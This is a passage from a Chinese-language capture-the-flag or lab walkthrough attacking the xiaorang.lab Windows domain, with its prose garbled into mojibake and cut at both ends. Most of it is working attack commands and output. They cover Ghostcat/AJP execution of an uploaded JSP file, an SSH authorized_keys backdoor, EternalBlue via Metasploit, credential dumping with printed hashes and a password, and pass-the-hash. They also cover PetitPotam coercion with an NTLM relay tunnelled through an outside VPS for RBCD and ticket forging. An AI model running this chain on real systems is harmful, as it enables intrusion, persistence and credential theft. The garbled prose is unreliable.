out.println(new String(b));</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742965600238-fb7b31e5-87ef-4de4-b918-129cd9685caa.png"></p><p>è¿”å›è·¯å¾„ .&#x2F;upload&#x2F;4332ca5e87df3ffe57f09321848a920a&#x2F;20250326010633582.txt</p><p>vpsèµ·ä¸ªç›‘å¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http://39.98.116.168:8080/   8009 /upload/4332ca5e87df3ffe57f09321848a920a/20250326010633582.txt eval</span><br><span class="line"></span><br><span class="line">       _    _         __ _                 _            </span><br><span class="line">      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ </span><br><span class="line">     //_\\ | | &#x27;_ \  \ \| &#x27;_ \ / _ \ / _ \| __/ _ \ &#x27;__|</span><br><span class="line">    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   </span><br><span class="line">    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   </span><br><span class="line">         |__/|_|                                        </span><br><span class="line">                                                00theway,just for test</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742965895380-498bdd49-6d11-4eff-9243-07ad18693a04.png"></p><p>æ‰¾ä¸€ä¸‹flagæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -name &#x27;*flag*&#x27; 2&gt;/dev/null&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742965992071-40a25aee-ac10-4ba1-917e-ada11192fe66.png"></p><p>å†™å…¬é’¥ç•™åé—¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#è‡ªå·±çš„æœºå™¨ä¸Š</span><br><span class="line">ssh-keygen -t rsa -b 4096</span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br><span class="line">#å¼¹çš„shell</span><br><span class="line">echo &quot;~/.ssh/id_rsa.pubçš„å†…å®¹&quot; &gt; /root/.ssh/authorized_keys</span><br><span class="line">chmod 600 /root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line">ssh -i ~/.ssh/id_rsa root@39.99.140.174</span><br></pre></td></tr></table></figure><h2 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h2><p>ä¸Šä»£ç†ï¼Œæ‰«æ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742966440528-e934a2f9-feb1-4299-8c1a-b4684ea38ffe.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.22.11.0/24</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 172.22.11.76    is alive</span><br><span class="line">(icmp) Target 172.22.11.6     is alive</span><br><span class="line">(icmp) Target 172.22.11.26    is alive</span><br><span class="line">(icmp) Target 172.22.11.45    is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.11.26:445 open</span><br><span class="line">172.22.11.45:445 open</span><br><span class="line">172.22.11.6:445 open</span><br><span class="line">172.22.11.45:139 open</span><br><span class="line">172.22.11.26:139 open</span><br><span class="line">172.22.11.26:135 open</span><br><span class="line">172.22.11.6:139 open</span><br><span class="line">172.22.11.45:135 open</span><br><span class="line">172.22.11.6:135 open</span><br><span class="line">172.22.11.76:22 open</span><br><span class="line">172.22.11.6:88 open</span><br><span class="line">172.22.11.76:8080 open</span><br><span class="line">172.22.11.76:8009 open</span><br><span class="line">[*] alive ports len is: 13</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetBios 172.22.11.26    XIAORANG\XR-LCM3AE8B          </span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.11.26</span><br><span class="line">   [-&gt;]XR-LCM3AE8B</span><br><span class="line">   [-&gt;]172.22.11.26</span><br><span class="line">[*] NetBios 172.22.11.6     [+] DC:XIAORANG\XIAORANG-DC    </span><br><span class="line">[*] NetBios 172.22.11.45    XR-DESKTOP.xiaorang.lab             Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span><br><span class="line">[+] MS17-010 172.22.11.45       (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.11.6</span><br><span class="line">   [-&gt;]XIAORANG-DC</span><br><span class="line">   [-&gt;]172.22.11.6</span><br><span class="line">[*] WebTitle http://172.22.11.76:8080  code:200 len:7091   title:åå°ç®¡ç†</span><br><span class="line">å·²å®Œæˆ 13/13</span><br><span class="line">[*] æ‰«æç»“æŸ,è€—æ—¶: 8.210849878s</span><br></pre></td></tr></table></figure><p>åˆ†æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.11.45 XR-Desktop.xiaorang.lab</span><br><span class="line">172.22.11.6 xiaorang-dc.xiaorang.lab</span><br><span class="line">172.22.11.26 XR-LCM3AE8B.xiaorang.lab</span><br><span class="line">172.22.11.76  æœ¬æœº</span><br></pre></td></tr></table></figure><h2 id="æ°¸æ’ä¹‹è“"><a href="#æ°¸æ’ä¹‹è“" class="headerlink" title="æ°¸æ’ä¹‹è“"></a>æ°¸æ’ä¹‹è“</h2><p>45æ‰«åˆ°ms17-010</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line">set RHOSTS 172.22.11.45</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>å»adminç›®å½•ä¸‹æ‰¾åˆ°flag</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742967309061-7ecdeadd-a764-402c-9930-541645380e56.png"></p><p>æŠ“hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving all credentials</span><br><span class="line">msv credentials</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">Username     Domain    NTLM                              SHA1</span><br><span class="line">--------     ------    ----                              ----</span><br><span class="line">XR-DESKTOP$  XIAORANG  37fd17d6c6653c4e65093e33f50f7d3d  e774d3db0995fc0b8469093eb208aa7ece5abb9f</span><br><span class="line">yangmei      XIAORANG  25e42ef4cc0ab6a8ff9e3edbbda91841  6b2838f81b57faed5d860adaf9401b0edb269a6f</span><br><span class="line"></span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Username     Domain    Password</span><br><span class="line">--------     ------    --------</span><br><span class="line">(null)       (null)    (null)</span><br><span class="line">XR-DESKTOP$  XIAORANG  78 3f 3f 97 ea 43 e5 10 7e f8 16 06 4a 55 3d 95 51 a3 5b 02 6a a3 7b 76 c9 b3 34 88 d5 eb 8c 98 74 c1 4e 10 2b 13 b4 49 5</span><br><span class="line">                       4 ff c2 b1 3d 56 0c ce 6b 40 29 4c 83 d1 3d c9 dd 11 87 68 03 54 9f cc f7 c9 ce 53 1d 34 de 90 13 b9 a7 72 09 b7 bd 87 dc</span><br><span class="line">                        a6 cb 5e 77 a7 43 0e fe a1 ac 9b db 91 db 38 92 be e9 d5 cf 1a d2 33 08 e7 94 04 ac 9a 7a 1b df 73 0d ee b2 db fd 43 ca</span><br><span class="line">                       97 ff 6b 2e 1e c0 d4 03 73 56 56 f6 59 7c b7 6b 4e 0d df 54 3f 4f 85 df a8 05 39 22 f3 84 ad 90 d3 a7 b6 52 55 d1 4f 89 0</span><br><span class="line">                       2 5d 78 91 b1 f2 4b a5 8d aa 73 34 6e d0 17 7c 2d a4 57 21 f3 40 a7 b5 3a 87 a5 c3 fc 99 87 6a 72 22 b3 83 49 b9 1b b6 79</span><br><span class="line">                        68 a5 83 6d 49 5f 71 c2 dd 2d da 19 c9 ff 22 2c ce e3 96 e7 68 0d 42 1c 84 e4 68 8f ce 80 c7 76 aa 44 9e c4 e8 85</span><br><span class="line">yangmei      XIAORANG  xrihGHgoNZQ</span><br><span class="line"></span><br><span class="line">kerberos credentials</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">Username     Domain        Password</span><br><span class="line">--------     ------        --------</span><br><span class="line">(null)       (null)        (null)</span><br><span class="line">xr-desktop$  XIAORANG.LAB  78 3f 3f 97 ea 43 e5 10 7e f8 16 06 4a 55 3d 95 51 a3 5b 02 6a a3 7b 76 c9 b3 34 88 d5 eb 8c 98 74 c1 4e 10 2b 13 b4</span><br><span class="line">                           49 54 ff c2 b1 3d 56 0c ce 6b 40 29 4c 83 d1 3d c9 dd 11 87 68 03 54 9f cc f7 c9 ce 53 1d 34 de 90 13 b9 a7 72 09 b7</span><br><span class="line">                           bd 87 dc a6 cb 5e 77 a7 43 0e fe a1 ac 9b db 91 db 38 92 be e9 d5 cf 1a d2 33 08 e7 94 04 ac 9a 7a 1b df 73 0d ee b2</span><br><span class="line">                           db fd 43 ca 97 ff 6b 2e 1e c0 d4 03 73 56 56 f6 59 7c b7 6b 4e 0d df 54 3f 4f 85 df a8 05 39 22 f3 84 ad 90 d3 a7 b6</span><br><span class="line">                           52 55 d1 4f 89 02 5d 78 91 b1 f2 4b a5 8d aa 73 34 6e d0 17 7c 2d a4 57 21 f3 40 a7 b5 3a 87 a5 c3 fc 99 87 6a 72 22</span><br><span class="line">                           b3 83 49 b9 1b b6 79 68 a5 83 6d 49 5f 71 c2 dd 2d da 19 c9 ff 22 2c ce e3 96 e7 68 0d 42 1c 84 e4 68 8f ce 80 c7 76</span><br><span class="line">                           aa 44 9e c4 e8 85</span><br><span class="line">xr-desktop$  XIAORANG.LAB  (null)</span><br><span class="line">yangmei      XIAORANG.LAB  xrihGHgoNZQ</span><br></pre></td></tr></table></figure><p>hashdump</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:48f6da83eb89a4da8a1cc963b855a799:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure><p>å†æ”¶é›†ä¸‹åŸŸå†…ä¿¡æ¯ï¼Œè¿™é‡Œå¤šç§å·¥å…·éƒ½å¯ä»¥é€‰æ‹©ï¼Œæˆ‘ä»¬é€‰æ‹©yangmeiè¿™ä¸ªç”¨æˆ·ï¼ŒæŠŠä»–åŠ åˆ°ç®¡ç†å‘˜ç»„ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 psexec.py Administrator@172.22.11.45 -hashes :48f6da83eb89a4da8a1cc963b855a799 -codec gbk</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators yangmei /add</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742969105210-f28ac6b7-4fb4-41ea-abc2-f811a5529fb5.png"></p><p>åŸŸå†…ä¿¡æ¯æ”¶é›†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 bloodhound-python -u yangmei -p xrihGHgoNZQ -d XIAORANG.LAB --dns-tcp -ns 172.22.11.6 -c all --zip</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742970056600-93cfa66d-9515-4626-8d14-e8adeeca44c5.png"></p><p>åˆ†æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1ã€ä½¿ç”¨Bloodhoundæ”¶é›†åˆ°çš„ç”¨æˆ·åç»„åˆè·å–åˆ°çš„å¯†ç /hashesç»„åˆçˆ†ç ´ï¼Œæ²¡å‘ç°å…¶ä»–æ–°ç”¨æˆ·</span><br><span class="line">2ã€MAQ = 0ï¼ŒåŠ ä¸äº†è®¡ç®—æœº</span><br><span class="line">3ã€å½“å‰LDAP æ²¡ TLSï¼Œè¿œç¨‹ä¹ŸåŠ ä¸äº†è®¡ç®—æœºï¼Œimpacketçš„addcomputeræœ‰ä¸¤ç§æ–¹æ³•samrå’Œldapsã€‚samrå—åˆ°MAQ = 0çš„é™åˆ¶ï¼Œæ— æ³•æ·»åŠ è®¡ç®—æœºï¼›ldapså—åˆ° æ²¡TLS + MAQ = 0 çš„é™åˆ¶</span><br><span class="line">4ã€åŸŸæ§å­˜åœ¨nopacï¼Œå½“å‰ç”¨æˆ·yangmeiä½¿ç”¨nopacæ²¡æ‰“æ­»ï¼Œå¹¶ä¸”å¯¹åŸŸå†…computer containeræ²¡æœ‰createchildçš„ACL</span><br><span class="line">5ã€åŸŸæ§å­˜åœ¨nopacï¼Œå½“å‰ç”¨æˆ·yangmeiå¯¹å½“å‰windowsæœºå™¨xr-desktopæ²¡WriteDaclæƒé™ï¼Œæ„å‘³ç€æ— æ³•ä¿®æ”¹SamAccountName</span><br><span class="line">6ã€åŸŸå†…å­˜åœ¨ DFscoerce å’Œ petitpotamï¼Œä½†æ˜¯ä¸å­˜åœ¨CVE-2019-1040ï¼Œå› æ­¤æ”¾å¼ƒ DFscoerceï¼Œä¼˜å…ˆä½¿ç”¨petitpotam</span><br><span class="line">7ã€NoPac exploit: Ridter/noPac: Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user (github.com)</span><br></pre></td></tr></table></figure><p>æ‰«æWebClientå’Œpetitpotam</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M webdav </span><br><span class="line">proxychains crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M petitpotam</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742970360182-aeb0962c-55ff-4f69-82f4-7eec881a43b2.png"><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742970402986-b4bc86d5-ca24-48f3-8d67-7e5e54095e12.png"></p><p>å‚è€ƒï¼š<a href="https://forum.butian.net/share/1944">https://forum.butian.net/share/1944</a>å‘ç°æˆ‘ä»¬å¯ä»¥ç”¨Petitpotamå¼ºåˆ¶ç›®æ ‡æœåŠ¡å™¨ã€ç›®æ ‡ç”¨æˆ·ä½¿ç”¨LM Hashã€NTLM Hashå¯¹æˆ‘ä»¬çš„æœåŠ¡å™¨è¿›è¡Œè®¤è¯ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥å°†è¯¥è®¤è¯ä¸­ç»§è‡³å…¶ä»–ç›®æ ‡æœåŠ¡å™¨ä¸­ä»¥è¾¾åˆ°æ¨ªå‘ã€ææƒç­‰çš„ç›®çš„ï¼Œè¿™é‡Œåªæœ‰172.22.11.26æœ‰Petitpotamã€‚é€šè¿‡WebDavè¿›è¡ŒNTLM Relayçš„å¥½å¤„åœ¨äºå¯ä»¥ä¸å—åˆ°åè®®ç­¾åçš„å½±å“ï¼Œå¯¹æœ¬åœ°å†…éƒ¨ç½‘æˆ–å—ä¿¡ä»»çš„ç«™ç‚¹è‡ªåŠ¨ä½¿ç”¨å½“å‰ç”¨æˆ·å‡­æ®è¿›è¡ŒNTLMè®¤è¯ã€‚</p><p>ä½¿ç”¨æ— ADCS + Petitpotam + ntlmä¸­ç»§æ‰“æ³•ï¼Œæ€è·¯æ˜¯ç”¨petitpotamè§¦å‘å­˜åœ¨æ¼æ´ä¸”å¼€å¯äº†webclientæœåŠ¡çš„ç›®æ ‡ï¼Œåˆ©ç”¨petitpotamè§¦å‘ç›®æ ‡è®¿é—®æˆ‘ä»¬çš„httpä¸­ç»§æœåŠ¡ï¼Œç›®æ ‡å°†ä¼šä½¿ç”¨webclientæºå¸¦ntlmè®¤è¯è®¿é—®æˆ‘ä»¬çš„ä¸­ç»§ï¼Œå¹¶ä¸”å°†å…¶è®¤è¯ä¸­ç»§åˆ°ldapï¼Œè·å–åˆ°æœºå™¨è´¦æˆ·çš„èº«ä»½ï¼Œä»¥æœºå™¨è´¦æˆ·çš„èº«ä»½ä¿®æ”¹å…¶è‡ªèº«çš„msDS-AllowedToActOnBehalfOfOtherIdentityå±æ€§ï¼Œé…ç½®åˆ°XR-LCM3AE8B.xiaorang.labçš„RBCDã€‚</p><p>ä½†è¿™é‡Œæœ‰ä¸ªæ¡ä»¶ï¼Œéœ€è¦æˆ‘ä»¬æŠŠæœåŠ¡å™¨ç«¯å£çš„æµé‡è½¬å‘åˆ°å®¢æˆ·ç«¯æœ¬åœ°çš„80ï¼Œä½†SSHçš„åå‘ç«¯å£è½¬å‘ç›‘å¬çš„æ—¶å€™åªä¼šç›‘å¬127.0.0.1ï¼Œè¿™é‡Œæˆ‘ä»¬è®©æµé‡ 0.0.0.0:80 è½¬å‘åˆ° 127.0.0.1:79ï¼Œå†åå‘è½¬å‘å›å®¢æˆ·ç«¯æœ¬åœ°çš„80 ,å˜ç›¸ä½¿80ç›‘å¬åœ¨0.0.0.0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -i ~/.ssh/id_rsa root@39.98.107.181  -D SOCKSä»£ç†IP:PORT -R \*:79:127.0.0.1:80</span><br><span class="line">nohup socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:localhost:79 &amp;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">sshï¼šä½¿ç”¨ SSH è¿æ¥è¿œç¨‹æœåŠ¡å™¨ã€‚</span><br><span class="line"></span><br><span class="line">-i ~/.ssh/id_rsaï¼šæŒ‡å®š SSH ç§é’¥ id_rsa è¿›è¡Œèº«ä»½è®¤è¯ã€‚</span><br><span class="line"></span><br><span class="line">root@39.99.139.181ï¼šä»¥ root ç”¨æˆ·èº«ä»½è¿æ¥ 39.99.139.181 è¿™å°è¿œç¨‹æœåŠ¡å™¨ã€‚</span><br><span class="line"></span><br><span class="line">-D socksip:portï¼š</span><br><span class="line"></span><br><span class="line">-D é€‰é¡¹å¼€å¯ SOCKS ä»£ç†ï¼Œå³åœ¨æœ¬åœ° socksip:port ä¸Šå¯åŠ¨ä¸€ä¸ªåŠ¨æ€ç«¯å£è½¬å‘ä»£ç†ã€‚</span><br><span class="line">æ‰€æœ‰ç»ç”±è¿™ä¸ªä»£ç†çš„æµé‡éƒ½ä¼šé€šè¿‡ 39.99.139.181 è¿™å°æœåŠ¡å™¨è½¬å‘ï¼Œç±»ä¼¼äº ç¿»å¢™ä»£ç†ï¼ˆSOCKS5 ä»£ç†ï¼‰ã€‚</span><br><span class="line">-R \*:79:127.0.0.1:80ï¼š</span><br><span class="line"></span><br><span class="line">-R é€‰é¡¹è¡¨ç¤º è¿œç¨‹ç«¯å£è½¬å‘ã€‚</span><br><span class="line">\*: è¡¨ç¤ºç»‘å®šåˆ°æ‰€æœ‰ç½‘å¡ï¼ˆå³å…è®¸ä»»æ„ IP è®¿é—®è¿™ä¸ªç«¯å£ï¼‰ã€‚</span><br><span class="line">79:127.0.0.1:80 è¡¨ç¤ºï¼š</span><br><span class="line">è¿œç¨‹æœåŠ¡å™¨ (39.99.139.181) çš„ 79 ç«¯å£ ä¼šè½¬å‘åˆ° æœ¬åœ°ï¼ˆSSH å®¢æˆ·ç«¯æ‰€åœ¨æœºå™¨ï¼‰çš„ 127.0.0.1:80 ç«¯å£ã€‚</span><br><span class="line">socatï¼šä¸€ä¸ªå¼ºå¤§çš„ç½‘ç»œå·¥å…·ï¼Œå¸¸ç”¨äºç«¯å£è½¬å‘å’Œä»£ç†ã€‚</span><br><span class="line"></span><br><span class="line">TCP-LISTEN:80,fork,bind=0.0.0.0ï¼š</span><br><span class="line"></span><br><span class="line">TCP-LISTEN:80ï¼šç›‘å¬ æœ¬æœº 80 ç«¯å£ï¼Œç­‰å¾… TCP è¿æ¥ã€‚</span><br><span class="line">forkï¼šæ¯æ¬¡æœ‰æ–°è¿æ¥æ—¶ï¼Œè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹å¤„ç†è¿æ¥ï¼ˆé˜²æ­¢é˜»å¡ï¼‰ã€‚</span><br><span class="line">bind=0.0.0.0ï¼šç›‘å¬ æ‰€æœ‰ IPï¼ˆå¤–éƒ¨å’Œæœ¬åœ°ï¼‰ çš„è¯·æ±‚ã€‚</span><br><span class="line">TCP:localhost:79ï¼š</span><br><span class="line"></span><br><span class="line">å½“æ”¶åˆ° 80 ç«¯å£çš„è¯·æ±‚ï¼Œä¼šå°†æµé‡ è½¬å‘åˆ° localhost:79 ç«¯å£ã€‚</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæµé‡å·²ç»æˆåŠŸè½¬å‘ï¼Œcurl 172.22.11.76çš„æµé‡è½¬å‘åˆ°äº†æˆ‘ä»¬æœ¬åœ°kali</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 80</span><br><span class="line">proxychains curl http://172.22.11.76:80</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742972622202-c878d395-6ead-4727-92bf-105cc0fe65c3.png"><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742974674648-ea7a21e3-2de5-4d95-a8e3-3b92746bdc00.png"></p><h2 id="Relay-via-WebDAV-Petitpotamçš„Coerce-Authentication"><a href="#Relay-via-WebDAV-Petitpotamçš„Coerce-Authentication" class="headerlink" title="Relay via WebDAV+Petitpotamçš„Coerce Authentication"></a>Relay via WebDAV+Petitpotamçš„Coerce Authentication</h2><p>æ¥ç€æœ¬åœ°å¼€å¯å¼€å¯ntlmrelayxï¼Œåˆ©ç”¨å‰é¢æ‹¿ä¸‹çš„XR-Desktopä½œä¸ºæ¶æ„æœºå™¨è´¦æˆ·è®¾ç½®RBCDï¼Œæ¥ç€ä½¿ç”¨<a href="https://github.com/topotam/PetitPotam">Petitpotam</a>è§¦å‘XR-LCM3AE8Bè®¤è¯åˆ°172.22.11.76</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 ntlmrelayx.py -t ldap://172.22.11.6 --no-dump --no-da --no-acl --escalate-user &#x27;xr-desktop$&#x27; --delegate-access</span><br><span class="line"></span><br><span class="line">ç„¶åæ‰“petitpotamå¼ºåˆ¶è®¤è¯</span><br><span class="line">proxychains python3 PetitPotam.py -u yangmei -p &#x27;xrihGHgoNZQ&#x27; -d xiaorang.lab ubuntu@80/pwn.txt 172.22.11.26</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742981422611-9816c06b-a2eb-4459-98d4-5e419eb47cf0.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742975249440-dd0c22cd-09df-42dd-b1a6-d29b8d74fab5.png"></p><h2 id="åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾"><a href="#åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾" class="headerlink" title="åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾"></a>åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾</h2><p>é…å¥½åç›´æ¥ç”¨ä¹‹å‰172.22.11.45ä¸ŠæŠ“çš„æœºå™¨è´¦æˆ·XR-DESKTOP$å“ˆå¸Œæ‰“172.22.11.26çš„RBCDï¼Œæ‹¿ç™½é“¶ç¥¨æ®</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742981924104-f66e75d8-f2f6-435a-813b-7a697be00090.png"></p><p>æ”¹ä¸ªåå­—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-getST -spn cifs/XR-LCM3AE8B.xiaorang.lab -impersonate administrator -hashes :37fd17d6c6653c4e65093e33f50f7d3d  xiaorang.lab/XR-Desktop\$ -dc-ip 172.22.11.6</span><br><span class="line"></span><br><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line"></span><br><span class="line">sudo vim /etc/hosts#æŠŠXR-LCM3AE8B.xiaorang.labçš„ipåŠ åˆ°hostsé‡Œ</span><br><span class="line">172.22.11.26 XR-LCM3AE8B.xiaorang.lab</span><br></pre></td></tr></table></figure><p>å¯¼å…¥ccacheåï¼Œæœ€åå³å¯æ— å¯†ç è¿æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 